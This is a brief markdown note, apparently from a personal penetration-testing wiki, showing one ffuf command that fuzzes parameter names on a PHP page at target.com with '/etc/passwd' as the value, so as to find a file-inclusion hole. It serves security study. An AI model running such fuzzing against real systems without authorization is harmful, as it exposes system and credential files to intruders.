---
title: Fuff
description: 
draft: false
tags: 
date:
---

Fuzz file path's to look for `/etc/passwd`
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -fs 0 -u http://target.com/blog-post/archives/randylogs.php?FUZZ=/etc/passwd
```


---
### Supporting Content
